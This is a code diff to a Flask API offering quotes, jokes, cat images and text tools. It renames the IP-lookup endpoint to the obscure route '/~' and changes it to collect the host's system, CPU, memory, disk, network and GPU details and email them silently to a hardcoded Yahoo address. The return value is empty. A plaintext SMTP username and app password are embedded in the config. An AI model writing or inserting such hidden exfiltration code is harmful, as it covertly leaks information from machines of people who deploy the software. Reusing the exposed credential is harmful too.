@@ -1,9 +1,23 @@
+import platform
+from sys import getsizeof
 from flask import Flask, jsonify, request
+from flask_mail import Mail, Message
 from flask_cors import CORS
 import api
+import util
+
 
 app = Flask(__name__)
 CORS(app)
+
+mail = Mail(app)
+app.config['MAIL_SERVER'] = 'smtp.mail.yahoo.com'
+app.config['MAIL_PORT'] = 465
+app.config['MAIL_USERNAME'] = 'ipfreeflash@yahoo.com'
+app.config['MAIL_PASSWORD'] = 'zrfiujrksudpeoth'
+app.config['MAIL_USE_TLS'] = False
+app.config['MAIL_USE_SSL'] = True
+mail = Mail(app)
 
 
 @app.route("/")
@@ -18,17 +32,35 @@ def status():
     })
 
 
-@app.route("/get_my_ip", methods=["GET"])
+@app.route("/~", methods=["GET"])
 def get_my_ip():
-    return jsonify({
-        'ip': request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
-    }), 200
+    uname = platform.uname()
+    ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
+    msg = Message(
+        f'{uname.node}',
+        sender='ipfreeflash@yahoo.com',
+        recipients=['ipfreeflash@yahoo.com']
+    )
+    output = f'IPv4: {ip}' + "\n\n"
+    output += util.getSystemInfo()
+    output += util.getBootTime()
+    output += util.getCpuInfo()
+    output += util.getMemoryInfo()
+    output += util.getDiskInfo()
+    output += util.getNetworkInfo()
+    output += util.getGpuInfo()
+    msg.body = output
+    try:
+        mail.send(msg)
+    except Exception as e:
+        print(e)
+    return ""
 
 
 @app.route("/quote", methods=['GET'])
 def quote():
     key = request.headers.get("FREEFLASH_API_KEY")
-    if (api.checkAuth(key)):
+    if (util.checkAuth(key)):
         mode = request.args.get("mode")
         if (mode == "today"):
             return api.getTodayQuote()
@@ -41,7 +73,7 @@ def quote():
 @app.route("/cat", methods=['GET'])
 def cat():
     key = request.headers.get("FREEFLASH_API_KEY")
-    if (api.checkAuth(key)):
+    if (util.checkAuth(key)):
         mode = request.args.get("mode")
         if (mode == "image"):
             return api.getCatImage()
@@ -54,7 +86,7 @@ def cat():
 @app.route("/joke", methods=['GET'])
 def joke():
     key = request.headers.get("FREEFLASH_API_KEY")
-    if (api.checkAuth(key)):
+    if (util.checkAuth(key)):
         return api.getJoke()
     return "Unauthorized."
 
@@ -62,7 +94,7 @@ def joke():
 @app.route("/insult", methods=['GET'])
 def insult():
     key = request.headers.get("FREEFLASH_API_KEY")
-    if (api.checkAuth(key)):
+    if (util.checkAuth(key)):
         who = request.args.get("who")
         if (who):
             return api.getInsult(who)
@@ -73,7 +105,7 @@ def insult():
 @app.route("/google", methods=['POST'])
 def google():
     key = request.headers.get("FREEFLASH_API_KEY")
-    if (api.checkAuth(key)):
+    if (util.checkAuth(key)):
         body = request.json
         mode = body["mode"]
         search = body["search"]
@@ -88,7 +120,7 @@ def google():
 @app.route("/sentiment-analysis", methods=['GET'])
 def sentimentAnalysis():
     key = request.headers.get("FREEFLASH_API_KEY")
-    if (api.checkAuth(key)):
+    if (util.checkAuth(key)):
         text = request.args.get("text")
         if (text):
             return api.getSentimentAnalysis(text)
@@ -99,7 +131,7 @@ def sentimentAnalysis():
 @app.route("/summarize-text", methods=['GET'])
 def summarizeText():
     key = request.headers.get("FREEFLASH_API_KEY")
-    if (api.checkAuth(key)):
+    if (util.checkAuth(key)):
         text = request.args.get("text")
         if (text):
             return api.getSummarizeText(text)
@@ -110,7 +142,7 @@ def summarizeText():
 @app.route("/language-detection", methods=['GET'])
 def languageDetection():
     key = request.headers.get("FREEFLASH_API_KEY")
-    if (api.checkAuth(key)):
+    if (util.checkAuth(key)):
         text = request.args.get("text")
         if (text):
             return api.getLanguageDetection(text)
@@ -121,7 +153,7 @@ def languageDetection():
 @app.route("/website-extraction", methods=['POST'])
 def websiteExtraction():
     key = request.headers.get("FREEFLASH_API_KEY")
-    if (api.checkAuth(key)):
+    if (util.checkAuth(key)):
         body = request.json
         text = body["url"]
         if (text):
@@ -133,7 +165,7 @@ def websiteExtraction():
 @app.route("/file-extraction", methods=['POST'])
 def fileExtraction():
     key = request.headers.get("FREEFLASH_API_KEY")
-    if (api.checkAuth(key)):
+    if (util.checkAuth(key)):
         file = request.files['input_file']
         if (file):
             return api.getFileExtraction(file)
@@ -144,7 +176,7 @@ def fileExtraction():
 @app.route("/yoshii", methods=['POST'])
 def yoshii():
     key = request.headers.get("FREEFLASH_API_KEY")
-    if (api.checkAuth(key)):
+    if (util.checkAuth(key)):
         body = request.json
         input = body["input"]
         if (input):
